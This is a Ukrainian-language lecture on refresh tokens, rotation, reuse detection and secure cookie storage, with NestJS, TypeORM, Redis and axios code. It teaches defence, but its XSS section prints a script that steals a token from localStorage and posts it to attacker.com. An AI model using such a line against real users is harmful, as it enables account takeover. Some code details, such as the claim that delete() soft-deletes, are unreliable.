# Refresh Token та безпечне оновлення доступу

## Короткий зміст

У цій лекції вивчається архітектура пари токенів (Access + Refresh) та механізми безпечного оновлення доступу:

- **Проблема довгоживучих Access Token** — довгий TTL (7 днів) означає, що скомпрометований токен залишається валідним до закінчення терміну, неможливість відкликання без blacklist
- **Архітектура пари токенів** — короткий Access Token (15 хв) для доступу до API, довгий Refresh Token (7-30 днів) для отримання нового Access Token
- **Потік авторизації** — клієнт отримує обидва токени при логіні, використовує Access Token для запитів, при 401 (токен прострочений) використовує Refresh Token для отримання нової пари
- **Зберігання Refresh Token** — БД (таблиця `refresh_tokens` з `userId`, `token`, `expiresAt`) або Redis (з TTL), можливість відкликання через видалення з БД
- **Refresh Token Rotation** — при кожному використанні Refresh Token видається нова пара токенів, старий Refresh Token інвалідується, захист від token replay attacks
- **Реалізація ендпоінтів** — `/auth/login` повертає обидва токени, `/auth/refresh` приймає Refresh Token та повертає нову пару, `/auth/logout` видаляє Refresh Token з БД
- **Безпечне зберігання на клієнті** — HttpOnly Cookie для Refresh Token (недоступний для JavaScript), LocalStorage/Memory для Access Token, компроміс між безпекою та UX

Розглядаються сценарії компрометації токенів, detection mechanisms для виявлення token theft (використання старого Refresh Token після rotation), автоматичне відкликання всіх токенів користувача при підозрілій активності.

---

::card-group

::card{title="🎯 Мета лекції" icon="i-lucide-target"}

- Зрозуміти фундаментальні проблеми довгоживучих JWT токенів та неможливість їхнього відкликання.
- Опанувати архітектурний паттерн пари токенів (Access + Refresh) для балансу безпеки та UX.
- Навчитися реалізовувати Refresh Token Rotation для захисту від token replay атак.
- Розуміти компроміси між різними стратегіями зберігання токенів на клієнті.

::

::card{title="🔑 Ключові терміни" icon="i-lucide-key"}

- **Access Token:** короткоживучий JWT токен для доступу до захищених API ендпоінтів (TTL: 15-60 хвилин).
- **Refresh Token:** довгоживучий токен для отримання нової пари токенів без повторного введення пароля (TTL: 7-30 днів).
- **Token Rotation:** механізм інвалідації старого Refresh Token при видачі нової пари токенів.
- **Token Reuse Detection:** система виявлення спроб використання вже інвалідованого Refresh Token (ознака компрометації).

::

::

---

## Проблема довгоживучих Access Token

У попередніх лекціях ми розглянули механізм JWT автентифікації, де користувач отримує токен після успішного входу та використовує його для доступу до захищених ендпоінтів. Проте виникає фундаментальна дилема:

**Дилема TTL (Time To Live):**

- **Короткий TTL (15 хвилин):** користувач змушений повторно вводити пароль кожні 15 хвилин → погана користувацька взаємодія (*poor UX*).
- **Довгий TTL (7 днів):** користувач залишається автентифікованим тиждень, але скомпрометований токен залишається валідним усі 7 днів → катастрофічна вразливість безпеки.

### Сценарій компрометації токена

Припустимо, застосунок видає JWT токен з TTL 7 днів для зручності користувача:

```typescript
// Генерація Access Token з довгим TTL
const accessToken = this.jwtService.sign(
  { sub: user.id, email: user.email },
  { expiresIn: '7d' } // ❌ Небезпечно довгий TTL
);
```

**Атака через XSS (Cross-Site Scripting):**

Якщо у застосунку є вразливість XSS, зловмисник може ін'єктувати JavaScript код, що витягує токен з `localStorage`:

```javascript
// Шкідливий скрипт, ін'єктований через XSS
const stolenToken = localStorage.getItem('access_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

Після крадіжки токена зловмисник може:

1. **Використовувати токен для доступу до API** протягом усіх 7 днів.
2. **Отримувати чутливі дані** користувача (email, профіль, платіжна інформація).
3. **Виконувати дії від імені користувача** (зміна налаштувань, транзакції).

**Чому неможливо відкликати JWT токен?**

JWT токени є **самодостатніми** (*self-contained*) — сервер не зберігає їхній стан і не перевіряє базу даних при кожному запиті. Це означає:

- ❌ Немає механізму «видалення» токена з сервера — він просто не існує на сервері як запис у БД.
- ❌ Зміна пароля користувача не інвалідує активні токени (вони містять старі дані, але підпис залишається валідним до `exp`).
- ❌ Блокування облікового запису не впливає на вже видані токени.

**Єдині способи відкликання JWT (усі мають недоліки):**

::code-group

```typescript [1. Blacklist (токен-лист заборонених)]
// ❌ Втрата переваги stateless
const blacklist = new Set<string>();

async function verifyToken(token: string) {
  if (blacklist.has(token)) {
    throw new UnauthorizedException('Token revoked');
  }
  return this.jwtService.verify(token);
}

// Проблема: потрібно зберігати всі відкликані токени до їхнього exp
// При 1 млн користувачів це може бути 10+ млн записів у пам'яті
```

```typescript [2. Перевірка БД при кожному запиті]
// ❌ Втрата продуктивності
async function verifyToken(token: string) {
  const payload = this.jwtService.verify(token);
  
  // Додатковий запит до БД при кожному HTTP-запиті
  const user = await this.usersService.findById(payload.sub);
  
  if (!user || !user.isActive) {
    throw new UnauthorizedException('User inactive');
  }
  
  return payload;
}

// Проблема: втрата переваги JWT (stateless) + навантаження на БД
```

```typescript [3. Короткий TTL + примус повторного входу]
// ❌ Погана UX
const accessToken = this.jwtService.sign(payload, {
  expiresIn: '15m' // Користувач входить кожні 15 хвилин
});

// Проблема: користувачі скаржаться на незручність
```

::

::note
Жоден із цих підходів не є оптимальним. Blacklist та перевірка БД знищують переваги JWT (stateless, масштабованість), тоді як короткий TTL знищує користувацьку зручність. Саме тому індустрія прийшла до патерну **Refresh Token**.
::

---

## Архітектура пари токенів: Access + Refresh

Рішенням дилеми є використання **двох незалежних токенів** з різним призначенням та термінами життя:

::mermaid

```mermaid
graph TB
    subgraph "Пара токенів"
        A[Access Token<br/>TTL: 15 хвилин]
        B[Refresh Token<br/>TTL: 7-30 днів]
    end
    
    A -->|Використовується для| C[API Requests<br/>GET /users/profile<br/>POST /posts]
    B -->|Використовується для| D[Token Refresh<br/>POST /auth/refresh]
    
    C -->|401 Unauthorized<br/>токен прострочений| E[Клієнт викликає<br/>/auth/refresh]
    E -->|Надсилає Refresh Token| D
    D -->|Повертає нову пару| F[Новий Access Token<br/>+ Новий Refresh Token]
    F --> A
    F --> B
    
    style A fill:#3b82f6,stroke:#1d4ed8,color:#ffffff
    style B fill:#10b981,stroke:#047857,color:#ffffff
    style C fill:#8b5cf6,stroke:#6d28d9,color:#ffffff
    style D fill:#f59e0b,stroke:#b45309,color:#ffffff
```

::

### Характеристики Access Token

**Призначення:** Короткоживучий токен для доступу до захищених API ендпоінтів.

**Властивості:**

- **TTL:** 15-60 хвилин (рекомендовано 15 хвилин для високобезпечних систем).
- **Формат:** стандартний JWT токен з підписом.
- **Зберігання:** пам'ять (*in-memory*) або `sessionStorage` на клієнті.
- **Payload:** мінімальні дані користувача (`userId`, `email`, `roles`).
- **Відкликання:** неможливе — токен валідний до `exp`, але короткий TTL мінімізує вікно вразливості.

**Структура Access Token:**

```json
{
  "sub": "550e8400-e29b-41d4-a716-446655440000",
  "email": "ivan@example.com",
  "roles": ["user"],
  "tokenType": "access",
  "iat": 1693564800,
  "exp": 1693565700
}
```

### Характеристики Refresh Token

**Призначення:** Довгоживучий токен для отримання нової пари токенів без повторного введення пароля.

**Властивості:**

- **TTL:** 7-30 днів (залежно від політики безпеки організації).
- **Формат:** випадковий UUID або JWT токен (залежно від реалізації).
- **Зберігання:** **БД або Redis** на сервері + HttpOnly Cookie на клієнті.
- **Payload (якщо JWT):** мінімум даних, часто лише `userId` та `tokenId`.
- **Відкликання:** можливе через видалення з БД — це ключова перевага.

**Варіанти формату Refresh Token:**

::code-group

```typescript [Варіант 1: Випадковий UUID]
import { randomUUID } from 'crypto';

// ✅ Простий, легко інвалідувати, потребує зберігання у БД
const refreshToken = randomUUID();
// "6ba7b810-9dad-11d1-80b4-00c04fd430c8"

// Зберігаємо у БД
await this.refreshTokenRepository.save({
  token: refreshToken,
  userId: user.id,
  expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
});
```

```typescript [Варіант 2: JWT з мінімальним payload]
// ⚠️ Може бути декодований на клієнті, але не може бути підроблений
const refreshToken = this.jwtService.sign(
  {
    sub: user.id,
    tokenType: 'refresh',
    tokenId: randomUUID(), // Унікальний ID для tracking
  },
  {
    secret: process.env.REFRESH_TOKEN_SECRET, // Окремий секрет!
    expiresIn: '7d',
  }
);

// Зберігаємо tokenId у БД для можливості відкликання
await this.refreshTokenRepository.save({
  tokenId: tokenId,
  userId: user.id,
  expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
});
```

::

::tip
**Рекомендація:** для більшості застосунків варіант із випадковим UUID є простішим та безпечнішим — немає ризику витоку інформації через декодування JWT, та немає потреби у окремому секретному ключі. JWT варіант корисний, якщо потрібна додаткова метаінформація у токені (наприклад, device fingerprint).
::

### Переваги архітектури пари токенів

**1. Баланс безпеки та UX:**

- Короткий Access Token мінімізує вікно вразливості при компрометації (15 хв замість 7 днів).
- Довгий Refresh Token зберігає зручність — користувач не вводить пароль повторно протягом 7-30 днів.

**2. Можливість відкликання:**

Refresh Token зберігається у БД, тому може бути видалений у будь-який момент:

- Користувач натискає «Logout» → Refresh Token видаляється з БД.
- Адміністратор блокує обліковий запис → всі Refresh Tokens користувача видаляються.
- Виявлено підозрілу активність → всі токени всіх пристроїв користувача інвалідуються.

**3. Granular контроль:**

Можна зберігати окремі Refresh Tokens для різних пристроїв:

```typescript
// Таблиця refresh_tokens
{
  id: "uuid",
  userId: "user-uuid",
  token: "refresh-token-value",
  deviceName: "iPhone 14 Pro",
  ipAddress: "203.0.113.42",
  userAgent: "Mozilla/5.0...",
  createdAt: "2026-09-01T10:00:00Z",
  expiresAt: "2026-09-08T10:00:00Z",
  lastUsedAt: "2026-09-06T15:30:00Z"
}
```

Користувач може переглянути список активних сесій та відкликати токени конкретних пристроїв:

```
Активні сесії:
✓ iPhone 14 Pro (Київ, Україна) — активний зараз
✓ MacBook Pro (Львів, Україна) — 2 години тому
✓ Chrome (Невідома локація) — 5 днів тому  [Відкликати]
```


---

## Потік автентифікації з Refresh Token

Розглянемо повну послідовність взаємодії між клієнтом та сервером від моменту входу до автоматичного оновлення токенів.

### Крок 1: Початковий вхід (Login)

Користувач надсилає email та пароль на ендпоінт `/auth/login`:

::mermaid

```mermaid
sequenceDiagram
    participant User as Користувач
    participant Client as Frontend App
    participant Server as Auth Server
    participant DB as База даних

    User->>Client: Вводить email + password
    Client->>Server: POST /auth/login<br/>{email, password}
    Server->>DB: Перевірка credentials
    DB-->>Server: User entity
    
    Server->>Server: bcrypt.compare(password, hash)
    
    alt Пароль валідний
        Server->>Server: Генерація Access Token<br/>TTL: 15 хвилин
        Server->>Server: Генерація Refresh Token<br/>TTL: 7 днів
        Server->>DB: Збереження Refresh Token
        DB-->>Server: Token збережено
        
        Server-->>Client: 200 OK<br/>{accessToken, refreshToken}
        Client->>Client: Зберігає Access Token<br/>у пам'яті/sessionStorage
        Client->>Client: Зберігає Refresh Token<br/>у HttpOnly Cookie
        Client-->>User: Успішний вхід
    else Пароль невалідний
        Server-->>Client: 401 Unauthorized
        Client-->>User: Помилка входу
    end
```

::

**Приклад відповіді від сервера:**

```json
{
  "statusCode": 200,
  "message": "Login successful",
  "data": {
    "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1NTBlODQwMC1lMjliLTQxZDQtYTcxNi00NDY2NTU0NDAwMDAiLCJlbWFpbCI6Iml2YW5AZXhhbXBsZS5jb20iLCJyb2xlcyI6WyJ1c2VyIl0sInRva2VuVHlwZSI6ImFjY2VzcyIsImlhdCI6MTY5MzU2NDgwMCwiZXhwIjoxNjkzNTY1NzAwfQ.4Hb3LM-TqHX-2JcGKz9yP3qF8vZ5nR7wQ1xS6mE9kLo",
    "refreshToken": "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
    "tokenType": "Bearer",
    "expiresIn": 900,
    "user": {
      "id": "550e8400-e29b-41d4-a716-446655440000",
      "email": "ivan@example.com",
      "roles": ["user"]
    }
  }
}
```

### Крок 2: Звичайні API запити (з валідним Access Token)

Користувач робить запити до захищених ендпоінтів, використовуючи Access Token у заголовку `Authorization`:

```http
GET /api/v1/users/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Сервер верифікує підпис токена та перевіряє `exp` claim:

```typescript
// JwtStrategy автоматично перевіряє токен
async validate(payload: any) {
  // Токен валідний, повертаємо дані користувача
  return {
    userId: payload.sub,
    email: payload.email,
    roles: payload.roles,
  };
}
```

**Успішна відповідь (200 OK):**

```json
{
  "statusCode": 200,
  "data": {
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "email": "ivan@example.com",
    "firstName": "Іван",
    "lastName": "Петренко"
  }
}
```

### Крок 3: Access Token прострочений (401 Unauthorized)

Через 15 хвилин Access Token досягає свого `exp` і стає недійсним:

::mermaid

```mermaid
sequenceDiagram
    participant Client as Frontend App
    participant Server as Auth Server
    participant RefreshEndpoint as /auth/refresh
    participant DB as База даних

    Client->>Server: GET /api/v1/users/profile<br/>Authorization: Bearer <expired_token>
    Server->>Server: JwtService.verify()
    Server-->>Client: 401 Unauthorized<br/>{error: "Token expired"}
    
    Note over Client: Перехоплює 401<br/>через Axios Interceptor
    
    Client->>RefreshEndpoint: POST /auth/refresh<br/>Cookie: refreshToken=6ba7b810...
    RefreshEndpoint->>DB: Пошук Refresh Token
    
    alt Token знайдено та валідний
        DB-->>RefreshEndpoint: RefreshToken entity
        RefreshEndpoint->>RefreshEndpoint: Генерація нової пари токенів
        RefreshEndpoint->>DB: Збереження нового Refresh Token
        RefreshEndpoint->>DB: Видалення старого Refresh Token
        RefreshEndpoint-->>Client: 200 OK<br/>{accessToken, refreshToken}
        
        Note over Client: Оновлює Access Token<br/>у пам'яті
        
        Client->>Server: Повторює оригінальний запит<br/>з новим Access Token
        Server-->>Client: 200 OK + дані
    else Token не знайдено або прострочений
        RefreshEndpoint-->>Client: 401 Unauthorized
        Note over Client: Перенаправлення<br/>на сторінку входу
    end
```

::

**Автоматична обробка оновлення токенів на клієнті (React):**

```typescript
// src/api/axios-instance.ts
import axios from 'axios';

const api = axios.create({
  baseURL: 'https://api.example.com',
  withCredentials: true, // Дозволяє надсилання HttpOnly Cookies
});

let isRefreshing = false;
let refreshSubscribers: Array<(token: string) => void> = [];

// Функція для підписки на результат оновлення токена
function subscribeTokenRefresh(callback: (token: string) => void) {
  refreshSubscribers.push(callback);
}

// Функція для сповіщення всіх підписників про новий токен
function onRefreshed(token: string) {
  refreshSubscribers.forEach((callback) => callback(token));
  refreshSubscribers = [];
}

// Interceptor для автоматичного оновлення токенів
api.interceptors.response.use(
  (response) => response, // Успішні відповіді пропускаємо
  async (error) => {
    const originalRequest = error.config;

    // Якщо отримали 401 та це не повторний запит
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Якщо токен вже оновлюється, чекаємо результату
        return new Promise((resolve) => {
          subscribeTokenRefresh((token: string) => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            resolve(api(originalRequest));
          });
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        // Спроба оновити токени
        const { data } = await axios.post(
          'https://api.example.com/auth/refresh',
          {},
          { withCredentials: true } // Надсилає HttpOnly Cookie з Refresh Token
        );

        const newAccessToken = data.data.accessToken;

        // Зберігаємо новий Access Token
        localStorage.setItem('access_token', newAccessToken);
        api.defaults.headers.common['Authorization'] = `Bearer ${newAccessToken}`;

        // Сповіщаємо всі запити, що чекають
        onRefreshed(newAccessToken);

        // Повторюємо оригінальний запит з новим токеном
        originalRequest.headers.Authorization = `Bearer ${newAccessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Оновлення токена не вдалося — перенаправляємо на логін
        localStorage.removeItem('access_token');
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);

export default api;
```

::tip
**Чому не використовувати Refresh Token для API запитів?** Refresh Token призначений виключно для ендпоінту `/auth/refresh` та ніколи не має надсилатися разом із звичайними запитами. Це мінімізує ризик його витоку — навіть якщо зловмисник перехопить усі HTTP запити, він не отримає Refresh Token, оскільки той зберігається у HttpOnly Cookie і надсилається лише при виклику `/auth/refresh`.
::

---

## Зберігання Refresh Token: БД vs Redis

Refresh Token має зберігатися на сервері для можливості відкликання. Існують два основні підходи: реляційна база даних (PostgreSQL) або in-memory кеш (Redis).

### Варіант 1: Зберігання у PostgreSQL

**Переваги:**
- ✅ Персистентність даних — токени не втрачаються при перезавантаженні сервера.
- ✅ Підтримка складних запитів (пошук за `userId`, `deviceName`, `ipAddress`).
- ✅ Можливість аналізу історії сесій (коли користувач останній раз використовував токен).

**Недоліки:**
- ❌ Повільніше за Redis (потребує запиту до диска).
- ❌ Додаткове навантаження на БД при високому трафіку.

**Структура таблиці:**

```sql
-- migrations/create-refresh-tokens-table.sql
CREATE TABLE refresh_tokens (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  token VARCHAR(255) UNIQUE NOT NULL,
  device_name VARCHAR(100),
  ip_address INET,
  user_agent TEXT,
  created_at TIMESTAMP DEFAULT NOW(),
  expires_at TIMESTAMP NOT NULL,
  last_used_at TIMESTAMP DEFAULT NOW(),
  
  -- Індекс для швидкого пошуку токена
  CONSTRAINT idx_refresh_token UNIQUE (token)
);

-- Індекс для пошуку токенів користувача
CREATE INDEX idx_refresh_tokens_user_id ON refresh_tokens(user_id);

-- Індекс для автоматичного видалення прострочених токенів
CREATE INDEX idx_refresh_tokens_expires_at ON refresh_tokens(expires_at);
```

**TypeORM Entity:**

```typescript
// src/auth/entities/refresh-token.entity.ts
import {
  Entity,
  Column,
  PrimaryGeneratedColumn,
  ManyToOne,
  CreateDateColumn,
  Index,
} from 'typeorm';
import { User } from '../../users/entities/user.entity';

@Entity('refresh_tokens')
export class RefreshToken {
  @PrimaryGeneratedColumn('uuid')
  id: string;

  @ManyToOne(() => User, { onDelete: 'CASCADE' })
  user: User;

  @Column({ unique: true })
  @Index()
  token: string;

  @Column({ nullable: true })
  deviceName: string;

  @Column({ type: 'inet', nullable: true })
  ipAddress: string;

  @Column({ type: 'text', nullable: true })
  userAgent: string;

  @CreateDateColumn()
  createdAt: Date;

  @Column({ type: 'timestamp' })
  @Index()
  expiresAt: Date;

  @Column({ type: 'timestamp', default: () => 'NOW()' })
  lastUsedAt: Date;
}
```

### Варіант 2: Зберігання у Redis

**Переваги:**
- ✅ Екстремально швидкий доступ (in-memory).
- ✅ Автоматичне видалення прострочених токенів через TTL.
- ✅ Менше навантаження на основну БД.

**Недоліки:**
- ❌ Втрата даних при перезавантаженні (якщо не налаштовано persistence).
- ❌ Обмежені можливості аналізу (немає історії використання токенів).

**Приклад збереження у Redis:**

```typescript
// src/auth/services/redis-token.service.ts
import { Injectable } from '@nestjs/common';
import { InjectRedis } from '@nestjs-modules/ioredis';
import Redis from 'ioredis';

@Injectable()
export class RedisTokenService {
  constructor(@InjectRedis() private readonly redis: Redis) {}

  /**
   * Збереження Refresh Token у Redis з TTL
   */
  async saveRefreshToken(
    userId: string,
    token: string,
    expiresIn: number // у секундах
  ): Promise<void> {
    const key = `refresh_token:${token}`;
    const value = JSON.stringify({
      userId,
      createdAt: new Date().toISOString(),
    });

    // Зберігаємо з автоматичним видаленням через TTL
    await this.redis.setex(key, expiresIn, value);

    // Додаткове зберігання для швидкого пошуку всіх токенів користувача
    await this.redis.sadd(`user_tokens:${userId}`, token);
    await this.redis.expire(`user_tokens:${userId}`, expiresIn);
  }

  /**
   * Перевірка існування токена
   */
  async validateRefreshToken(token: string): Promise<{ userId: string } | null> {
    const key = `refresh_token:${token}`;
    const value = await this.redis.get(key);

    if (!value) {
      return null;
    }

    return JSON.parse(value);
  }

  /**
   * Видалення токена (logout)
   */
  async revokeRefreshToken(token: string): Promise<void> {
    const key = `refresh_token:${token}`;
    const value = await this.redis.get(key);

    if (value) {
      const { userId } = JSON.parse(value);
      await this.redis.del(key);
      await this.redis.srem(`user_tokens:${userId}`, token);
    }
  }

  /**
   * Видалення всіх токенів користувача
   */
  async revokeAllUserTokens(userId: string): Promise<void> {
    const tokens = await this.redis.smembers(`user_tokens:${userId}`);

    const pipeline = this.redis.pipeline();
    tokens.forEach((token) => {
      pipeline.del(`refresh_token:${token}`);
    });
    pipeline.del(`user_tokens:${userId}`);

    await pipeline.exec();
  }
}
```

### Гібридний підхід (рекомендовано)

Для критичних застосунків використовуйте **комбінацію обох**:

- **Redis:** для швидкого пошуку валідності токена при кожному `/auth/refresh`.
- **PostgreSQL:** для збереження історії сесій, аналізу безпеки та відкликання через UI.

```typescript
async saveRefreshToken(userId: string, token: string, expiresAt: Date) {
  // 1. Зберігаємо у PostgreSQL для персистентності
  await this.refreshTokenRepository.save({
    userId,
    token,
    expiresAt,
    deviceName: this.extractDeviceName(userAgent),
  });

  // 2. Кешуємо у Redis для швидкого доступу
  const ttl = Math.floor((expiresAt.getTime() - Date.now()) / 1000);
  await this.redis.setex(`refresh_token:${token}`, ttl, userId);
}
```


---

## Refresh Token Rotation: захист від replay атак

**Token Rotation** — це механізм, де при кожному використанні Refresh Token для отримання нової пари токенів старий Refresh Token **автоматично інвалідується**. Це захищає від **token replay attacks**, де зловмисник перехоплює Refresh Token та намагається використати його пізніше.

### Чому rotation є критичним?

Припустимо, застосунок **не використовує rotation**:

1. Користувач логінеться та отримує `refresh_token_1` з TTL 7 днів.
2. Через 20 хвилин клієнт викликає `/auth/refresh` з `refresh_token_1` → отримує новий Access Token.
3. **Проблема:** `refresh_token_1` залишається валідним усі 7 днів!
4. Якщо зловмисник перехопив `refresh_token_1` (через XSS, MITM, витік бази даних), він може використовувати його **паралельно з легітимним користувачем** протягом усіх 7 днів.

::caution
**Критична вразливість:** без rotation один скомпрометований Refresh Token може використовуватися необмежену кількість разів до закінчення TTL. Система не має способу виявити, що токен використовується зловмисником.
::

### Принцип Token Rotation

::mermaid

```mermaid
sequenceDiagram
    participant Client as Легітимний клієнт
    participant Server as Auth Server
    participant DB as База даних
    participant Attacker as Зловмисник

    Note over Client,DB: День 1: Логін
    Client->>Server: POST /auth/login
    Server->>DB: Збереження refresh_token_1
    Server-->>Client: {accessToken, refreshToken: token_1}

    Note over Client,DB: День 2: Оновлення токенів
    Client->>Server: POST /auth/refresh<br/>refreshToken: token_1
    Server->>DB: Перевірка token_1
    DB-->>Server: Токен валідний
    Server->>DB: ❌ Видалення token_1
    Server->>DB: ✅ Збереження token_2
    Server-->>Client: {accessToken, refreshToken: token_2}
    
    Note over Client,Attacker: Зловмисник перехопив token_1
    
    Attacker->>Server: POST /auth/refresh<br/>refreshToken: token_1 (старий!)
    Server->>DB: Перевірка token_1
    DB-->>Server: ❌ Токен не знайдено (видалено)
    Server->>Server: 🚨 ТРИВОГА: Спроба reuse!
    Server->>DB: ❌ Видалення ВСІХ токенів userId
    Server-->>Attacker: 401 Unauthorized
    
    Note over Client: Легітимний користувач<br/>виштовхнутий з системи
    Client->>Server: Наступний запит з token_2
    Server->>DB: Перевірка token_2
    DB-->>Server: ❌ Видалено через reuse detection
    Server-->>Client: 401 Unauthorized<br/>Перенаправлення на логін
```

::

**Механізм виявлення компрометації:**

1. Легітимний користувач використовує `token_1` → сервер видає `token_2` та **видаляє** `token_1`.
2. Зловмисник намагається використати `token_1` → сервер бачить, що токен **вже був використаний**.
3. Сервер розуміє, що **або користувач, або зловмисник мають копію токена** → це ознака компрометації.
4. Сервер **негайно інвалідує всі Refresh Tokens користувача** на всіх пристроях.
5. Користувач та зловмисник отримують `401 Unauthorized` → користувач змушений увійти повторно.

### Реалізація Token Rotation

```typescript
// src/auth/auth.service.ts
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { RefreshToken } from './entities/refresh-token.entity';
import { randomUUID } from 'crypto';

@Injectable()
export class AuthService {
  private readonly ACCESS_TOKEN_TTL = '15m';
  private readonly REFRESH_TOKEN_TTL_DAYS = 7;

  constructor(
    private readonly jwtService: JwtService,
    @InjectRepository(RefreshToken)
    private readonly refreshTokenRepo: Repository<RefreshToken>,
  ) {}

  /**
   * Генерація пари токенів при логіні
   */
  async generateTokenPair(userId: string, email: string, roles: string[]) {
    const accessToken = this.jwtService.sign({
      sub: userId,
      email,
      roles,
      tokenType: 'access',
    }, {
      expiresIn: this.ACCESS_TOKEN_TTL,
    });

    const refreshToken = randomUUID();
    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + this.REFRESH_TOKEN_TTL_DAYS);

    // Зберігаємо Refresh Token у БД
    await this.refreshTokenRepo.save({
      user: { id: userId },
      token: refreshToken,
      expiresAt,
    });

    return {
      accessToken,
      refreshToken,
      expiresIn: 900, // 15 хвилин у секундах
    };
  }

  /**
   * Оновлення токенів з rotation
   */
  async refreshTokens(oldRefreshToken: string, ipAddress?: string) {
    // 1. Пошук токена у БД
    const tokenRecord = await this.refreshTokenRepo.findOne({
      where: { token: oldRefreshToken },
      relations: ['user'],
    });

    if (!tokenRecord) {
      // ❌ Токен не знайдено — можливо, вже був використаний (token reuse!)
      await this.handleTokenReuse(oldRefreshToken, ipAddress);
      throw new UnauthorizedException('Invalid refresh token');
    }

    // 2. Перевірка терміну дії
    if (new Date() > tokenRecord.expiresAt) {
      await this.refreshTokenRepo.delete(tokenRecord.id);
      throw new UnauthorizedException('Refresh token expired');
    }

    const user = tokenRecord.user;

    // 3. ❌ ВИДАЛЕННЯ СТАРОГО ТОКЕНА (ключовий крок rotation!)
    await this.refreshTokenRepo.delete(tokenRecord.id);

    // 4. ✅ ГЕНЕРАЦІЯ НОВОЇ ПАРИ ТОКЕНІВ
    const newAccessToken = this.jwtService.sign({
      sub: user.id,
      email: user.email,
      roles: user.roles,
      tokenType: 'access',
    }, {
      expiresIn: this.ACCESS_TOKEN_TTL,
    });

    const newRefreshToken = randomUUID();
    const newExpiresAt = new Date();
    newExpiresAt.setDate(newExpiresAt.getDate() + this.REFRESH_TOKEN_TTL_DAYS);

    // 5. Збереження нового Refresh Token
    await this.refreshTokenRepo.save({
      user: { id: user.id },
      token: newRefreshToken,
      expiresAt: newExpiresAt,
      lastUsedAt: new Date(),
      ipAddress,
    });

    return {
      accessToken: newAccessToken,
      refreshToken: newRefreshToken,
      expiresIn: 900,
    };
  }

  /**
   * Обробка спроби повторного використання токена
   */
  private async handleTokenReuse(token: string, ipAddress?: string) {
    // Пошук у історії використаних токенів (якщо зберігаємо історію)
    const historicalToken = await this.refreshTokenRepo.findOne({
      where: { token },
      withDeleted: true, // Включає видалені записи
      relations: ['user'],
    });

    if (historicalToken) {
      console.error(`🚨 Token reuse detected for user ${historicalToken.user.id} from IP ${ipAddress}`);

      // Інвалідація ВСІХ токенів користувача
      await this.refreshTokenRepo.delete({ user: { id: historicalToken.user.id } });

      // Опціонально: надіслати email-сповіщення користувачеві
      // await this.emailService.sendSecurityAlert(historicalToken.user.email, ipAddress);

      // Опціонально: логування у систему моніторингу безпеки
      // await this.securityLogger.logTokenReuse(historicalToken.user.id, token, ipAddress);
    }
  }
}
```

::warning
**Важливо:** для коректної роботи reuse detection необхідно або зберігати історію видалених токенів (через soft delete у TypeORM), або використовувати окрему таблицю `used_refresh_tokens` з TTL записів. Без історії система не зможе розрізнити невалідний токен та токен, що був скомпрометований.
::

### Soft Delete для історії токенів

```typescript
// src/auth/entities/refresh-token.entity.ts
import { Entity, Column, DeleteDateColumn } from 'typeorm';

@Entity('refresh_tokens')
export class RefreshToken {
  // ... інші поля

  @DeleteDateColumn()
  deletedAt?: Date; // Дата "видалення" (soft delete)
}
```

Тепер при виклику `refreshTokenRepo.delete()` запис не видаляється фізично, а отримує мітку `deletedAt`. Це дозволяє виявляти спроби reuse через `findOne({ withDeleted: true })`.

---

## Реалізація ендпоінтів у контролері

Розглянемо повну реалізацію трьох ключових ендпоінтів: логін, оновлення токенів та вихід.

### Ендпоінт POST /auth/login

```typescript
// src/auth/auth.controller.ts
import {
  Controller,
  Post,
  Body,
  HttpCode,
  HttpStatus,
  Res,
  Req,
} from '@nestjs/common';
import { Response, Request } from 'express';
import { AuthService } from './auth.service';
import { LoginDto } from './dto/login.dto';

@Controller('auth')
export class AuthController {
  constructor(private readonly authService: AuthService) {}

  @Post('login')
  @HttpCode(HttpStatus.OK)
  async login(
    @Body() dto: LoginDto,
    @Res({ passthrough: true }) response: Response,
    @Req() request: Request,
  ) {
    // Валідація credentials та генерація токенів
    const result = await this.authService.login(
      dto.email,
      dto.password,
      request.ip,
      request.headers['user-agent'],
    );

    // Встановлення Refresh Token у HttpOnly Cookie
    response.cookie('refreshToken', result.refreshToken, {
      httpOnly: true,        // ❌ JavaScript не може прочитати
      secure: true,          // ✅ Лише через HTTPS
      sameSite: 'strict',    // ✅ Захист від CSRF
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 днів у мілісекундах
      path: '/auth/refresh', // ✅ Cookie надсилається лише на /auth/refresh
    });

    return {
      statusCode: HttpStatus.OK,
      message: 'Login successful',
      data: {
        accessToken: result.accessToken,
        tokenType: 'Bearer',
        expiresIn: result.expiresIn,
        user: result.user,
        // ❌ НЕ повертаємо Refresh Token у body — він у Cookie
      },
    };
  }
}
```

**Пояснення параметрів Cookie:**

| Параметр | Значення | Призначення |
|----------|----------|-------------|
| `httpOnly: true` | ❌ JavaScript не може читати/змінювати Cookie | Захист від XSS атак — навіть якщо зловмисник ін'єктує скрипт, він не зможе отримати Refresh Token. |
| `secure: true` | ✅ Cookie надсилається лише через HTTPS | Захист від перехоплення у незашифрованих з'єднаннях. |
| `sameSite: 'strict'` | Cookie не надсилається у cross-site запитах | Захист від CSRF атак — зловмисницький сайт не зможе викликати `/auth/refresh` від імені користувача. |
| `path: '/auth/refresh'` | Cookie надсилається лише на `/auth/refresh` | Мінімізація поверхні атаки — токен не витікає через інші ендпоінти. |

